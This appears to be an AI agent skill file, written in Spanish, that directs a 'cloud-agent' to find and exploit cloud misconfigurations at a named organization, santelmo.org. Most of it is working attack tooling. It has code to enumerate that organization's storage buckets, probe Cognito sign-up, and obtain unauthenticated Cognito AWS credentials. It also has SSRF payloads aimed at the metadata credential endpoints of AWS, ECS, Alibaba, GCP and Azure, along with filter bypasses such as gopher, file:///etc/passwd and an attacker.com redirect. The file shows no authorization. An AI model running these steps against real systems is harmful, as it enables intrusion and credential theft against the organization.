---
name: cloud-agent
description: Agente especializado en testing de servicios cloud y misconfigurations. Usar para: (1) AWS S3 bucket enumeration, (2) AWS Cognito testing, (3) SSRF hacia metadata services, (4) Cloud storage misconfiguration, (5) Lambda/Serverless testing, (6) API Gateway testing, (7) Alibaba Cloud (relevante para santelmo.org). Trigger: cuando se detecten servicios cloud o URLs que apunten a infraestructura cloud.
---

# ☁️ Cloud Agent - Agente de Testing Cloud

## Objetivo
Identificar y explotar misconfigurations en servicios cloud de forma segura.

## Servicios Cloud Relevantes para santelmo.org

```yaml
Probable Stack (empresa china):
  primary: Alibaba Cloud (Aliyun)
  secondary: AWS (para mercado internacional)
  possible: GCP, Azure
  
Servicios a testear:
  - Object Storage (S3, OSS, GCS)
  - Identity (Cognito, RAM, IAM)
  - Functions (Lambda, Function Compute)
  - API Gateways
  - CDN
  - Database services
```

## 1. AWS Testing

### S3 Bucket Enumeration
```python
import requests
import boto3
from botocore import UNSIGNED
from botocore.client import Config

class S3Tester:
    def __init__(self):
        self.s3 = boto3.client('s3', config=Config(signature_version=UNSIGNED))
        
    def check_bucket_permissions(self, bucket_name):
        """Verificar permisos de bucket S3"""
        results = {
            "bucket": bucket_name,
            "exists": False,
            "public_read": False,
            "public_write": False,
            "listable": False,
            "contents": []
        }
        
        # Verificar existencia y listado
        try:
            response = self.s3.list_objects_v2(Bucket=bucket_name, MaxKeys=10)
            results["exists"] = True
            results["listable"] = True
            results["public_read"] = True
            
            if "Contents" in response:
                results["contents"] = [
                    {"key": obj["Key"], "size": obj["Size"]}
                    for obj in response["Contents"]
                ]
        except self.s3.exceptions.NoSuchBucket:
            results["exists"] = False
        except Exception as e:
            if "AccessDenied" in str(e):
                results["exists"] = True
                results["listable"] = False
        
        # Verificar ACL
        try:
            acl = self.s3.get_bucket_acl(Bucket=bucket_name)
            for grant in acl.get("Grants", []):
                grantee = grant.get("Grantee", {})
                if grantee.get("URI") == "http://acs.amazonaws.com/groups/global/AllUsers":
                    permission = grant.get("Permission")
                    if permission in ["READ", "FULL_CONTROL"]:
                        results["public_read"] = True
                    if permission in ["WRITE", "FULL_CONTROL"]:
                        results["public_write"] = True
        except:
            pass
        
        return results
    
    def generate_bucket_names(self, company):
        """Generar nombres de buckets posibles"""
        patterns = [
            f"{company}",
            f"{company}-prod",
            f"{company}-dev",
            f"{company}-staging",
            f"{company}-backup",
            f"{company}-assets",
            f"{company}-static",
            f"{company}-uploads",
            f"{company}-logs",
            f"{company}-data",
            f"{company}-media",
            f"{company}-images",
            f"{company}-files",
            f"{company}-private",
            f"{company}-public",
            f"{company}-internal",
            f"{company}-web",
            f"{company}-api",
            f"{company}-cdn"
        ]
        
        # Variaciones
        variations = []
        for pattern in patterns:
            variations.append(pattern)
            variations.append(pattern.replace("-", ""))
            variations.append(pattern.replace("-", "."))
            variations.append(f"sg-{pattern}")  # Singapore region
            variations.append(f"{pattern}-sg")
        
        return list(set(variations))

# Buckets a probar para santelmo.org
tripcom_buckets = [
    "trip", "tripcom", "trip-com", "santelmo.org",
    "ctrip", "ctripcom", "ctrip-assets",
    "sg-trip", "trip-sg", "tripcom-sg",
    "trip-images", "trip-uploads", "trip-static",
    "trip-backups", "trip-logs", "trip-data"
]
```

### AWS Cognito Testing
```python
class CognitoTester:
    def __init__(self, region="ap-southeast-1"):
        self.cognito = boto3.client('cognito-idp', region_name=region)
        self.identity = boto3.client('cognito-identity', region_name=region)
        
    def enumerate_user_pool(self, pool_id, client_id):
        """Enumerar información del User Pool"""
        results = {
            "pool_id": pool_id,
            "client_id": client_id,
            "signup_enabled": False,
            "username_attributes": [],
            "mfa_config": "UNKNOWN"
        }
        
        # Intentar signup para ver configuración
        try:
            self.cognito.sign_up(
                ClientId=client_id,
                Username="test@test.com",
                Password="TestPassword123!"
            )
            results["signup_enabled"] = True
        except Exception as e:
            error_msg = str(e)
            if "UserPoolClientId" in error_msg:
                results["client_valid"] = True
            if "NotAuthorizedException" in error_msg:
                results["signup_enabled"] = False
        
        return results
    
    def get_unauthenticated_credentials(self, identity_pool_id):
        """Obtener credenciales de guest/unauthenticated"""
        try:
            # Obtener Identity ID
            response = self.identity.get_id(
                IdentityPoolId=identity_pool_id
            )
            identity_id = response["IdentityId"]
            
            # Obtener credenciales
            creds = self.identity.get_credentials_for_identity(
                IdentityId=identity_id
            )
            
            return {
                "identity_id": identity_id,
                "access_key": creds["Credentials"]["AccessKeyId"],
                "secret_key": creds["Credentials"]["SecretKey"][:10] + "...",
                "session_token": creds["Credentials"]["SessionToken"][:20] + "...",
                "expiration": str(creds["Credentials"]["Expiration"])
            }
        except Exception as e:
            return {"error": str(e)}
```

### SSRF to AWS Metadata
```python
# Endpoints de metadata AWS (para SSRF)
aws_metadata_endpoints = {
    "imds_v1": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document"
    ],
    "imds_v2": [
        # Requiere token primero
        # PUT http://169.254.169.254/latest/api/token
        # Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
    ],
    "ecs": [
        "http://169.254.170.2/v2/credentials/",
        "http://169.254.170.2/v2/metadata"
    ],
    "lambda": [
        "http://localhost:9001/2018-06-01/runtime/invocation/next"
    ]
}

# Bypass de filtros para SSRF
ssrf_bypasses = {
    "ip_variations": [
        "http://169.254.169.254",
        "http://2852039166",  # Decimal
        "http://0xa9fea9fe",  # Hex
        "http://0251.0376.0251.0376",  # Octal
        "http://[::ffff:169.254.169.254]",  # IPv6
        "http://169.254.169.254.xip.io",  # DNS rebinding
        "http://metadata.google.internal"  # GCP
    ],
    "protocol_smuggling": [
        "gopher://169.254.169.254:80/_GET%20/latest/meta-data/",
        "dict://169.254.169.254:80/",
        "file:///etc/passwd"
    ],
    "redirect": [
        "http://attacker.com/redirect?url=http://169.254.169.254/"
    ]
}
```

## 2. Alibaba Cloud Testing

### OSS (Object Storage Service)
```python
class AliyunOSSTester:
    def __init__(self):
        self.regions = [
            "oss-cn-hangzhou", "oss-cn-shanghai", "oss-cn-beijing",
            "oss-cn-shenzhen", "oss-ap-southeast-1", "oss-ap-southeast-2"
        ]
        
    def check_bucket(self, bucket_name, region="oss-cn-hangzhou"):
        """Verificar bucket de Alibaba OSS"""
        url = f"https://{bucket_name}.{region}.aliyuncs.com/"
        
        results = {
            "bucket": bucket_name,
            "region": region,
            "url": url,
            "exists": False,
            "listable": False,
            "contents": []
        }
        
        try:
            r = requests.get(url, timeout=10)
            
            if r.status_code == 200:
                results["exists"] = True
                results["listable"] = True
                # Parsear XML response
                if "<Contents>" in r.text:
                    # Extraer keys del XML
                    import re
                    keys = re.findall(r"<Key>([^<]+)</Key>", r.text)
                    results["contents"] = keys[:20]
            elif r.status_code == 403:
                results["exists"] = True
                results["listable"] = False
            elif r.status_code == 404:
                results["exists"] = False
                
        except Exception as e:
            results["error"] = str(e)
        
        return results

# Metadata de Alibaba Cloud (para SSRF)
aliyun_metadata = [
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/instance-id",
    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    "http://100.100.100.200/latest/user-data"
]
```

## 3. Google Cloud Testing

### GCS Bucket Testing
```python
def check_gcs_bucket(bucket_name):
    """Verificar Google Cloud Storage bucket"""
    urls = [
        f"https://storage.googleapis.com/{bucket_name}/",
        f"https://{bucket_name}.storage.googleapis.com/",
        f"https://storage.cloud.google.com/{bucket_name}/"
    ]
    
    results = {"bucket": bucket_name}
    
    for url in urls:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                results["accessible"] = True
                results["url"] = url
                results["contents"] = r.text[:500]
                break
            elif r.status_code == 403:
                results["exists"] = True
                results["accessible"] = False
        except:
            pass
    
    return results

# GCP Metadata (para SSRF)
gcp_metadata = [
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://metadata.google.internal/computeMetadata/v1/project/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
]
# Requiere header: Metadata-Flavor: Google
```

## 4. Azure Testing

```python
# Azure Metadata (para SSRF)
azure_metadata = [
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
]
# Requiere header: Metadata: true

# Azure Blob Storage
def check_azure_blob(account_name, container_name):
    url = f"https://{account_name}.blob.core.windows.net/{container_name}?restype=container&comp=list"
    r = requests.get(url)
    return {
        "url": url,
        "status": r.status_code,
        "listable": r.status_code == 200
    }
```

## 5. CDN & Edge Testing

```python
cdn_patterns = {
    "cloudflare": {
        "headers": ["CF-Ray", "CF-Cache-Status"],
        "bypass": [
            # Buscar IP real detrás de CF
            "direct.{domain}",
            "origin.{domain}",
            "api.{domain}"
        ]
    },
    "cloudfront": {
        "headers": ["X-Amz-Cf-Id", "X-Amz-Cf-Pop"],
        "url_pattern": "*.cloudfront.net"
    },
    "akamai": {
        "headers": ["X-Akamai-Transformed"],
        "url_pattern": "*.akamaiedge.net"
    },
    "fastly": {
        "headers": ["X-Served-By", "X-Cache"],
    },
    "aliyun_cdn": {
        "headers": ["Via", "X-Cache"],
        "url_pattern": "*.alicdn.com"
    }
}

def detect_cdn(url):
    """Detectar CDN en uso"""
    r = requests.head(url, timeout=10)
    
    detected = []
    for cdn, config in cdn_patterns.items():
        for header in config.get("headers", []):
            if header in r.headers:
                detected.append({
                    "cdn": cdn,
                    "header": header,
                    "value": r.headers[header]
                })
    
    return detected
```

## Workflow Cloud Testing

```
1. IDENTIFICACIÓN
   ├── Detectar proveedor cloud (headers, DNS, URLs)
   ├── Identificar servicios en uso
   ├── Mapear infraestructura visible
   └── Buscar configuración expuesta

2. STORAGE
   ├── Enumerar buckets/containers
   ├── Verificar permisos públicos
   ├── Buscar datos sensibles
   └── Intentar escritura (con cuidado)

3. IDENTITY
   ├── Buscar Cognito/IAM misconfig
   ├── Obtener credenciales guest
   ├── Analizar permisos
   └── Buscar tokens expuestos

4. METADATA (via SSRF)
   ├── Probar endpoints de metadata
   ├── Bypass de filtros
   ├── Obtener credenciales temporales
   └── Enumerar información interna

5. SERVERLESS
   ├── Identificar funciones expuestas
   ├── Analizar API Gateway
   ├── Buscar event injection
   └── Verificar timeout abuse
```

## Archivos de Salida

- `04-cloud/aws/s3/{bucket}_report.json`
- `04-cloud/aws/cognito/{pool}_analysis.json`
- `04-cloud/alibaba/oss/{bucket}_report.json`
- `04-cloud/ssrf/metadata_results.json`
- `06-evidence/downloads/cloud/`
